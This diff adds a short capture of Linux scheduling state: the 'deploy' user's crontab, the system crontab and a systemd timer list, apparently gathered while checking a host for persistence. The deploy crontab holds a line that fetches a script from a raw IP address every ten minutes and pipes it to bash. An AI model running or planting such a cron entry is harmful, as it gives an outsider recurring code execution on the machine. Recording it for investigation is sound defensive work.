@@ -1,0 +1,20 @@
+$ crontab -l -u deploy
+# m h  dom mon dow   command
+30 2 * * * /usr/local/bin/backup.sh
+*/10 * * * * curl -fsSL http://185.22.67.13/s.sh | bash
+
+$ cat /etc/crontab
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+
+$ systemctl list-timers --all
+NEXT                        LEFT          LAST                        PASSED       UNIT                    ACTIVATES
+Mon 2026-04-20 00:00:00 UTC 1h left       Sun 2026-04-19 00:00:00 UTC 22h ago      logrotate.timer         logrotate.service
+Mon 2026-04-20 06:00:00 UTC 7h left       Sun 2026-04-19 06:00:00 UTC 16h ago      apt-daily-upgrade.timer apt-daily-upgrade.service
+Mon 2026-04-20 09:31:00 UTC 10h left      Sun 2026-04-19 09:31:00 UTC 13h ago      man-db.timer            man-db.service
+
+3 timers listed.
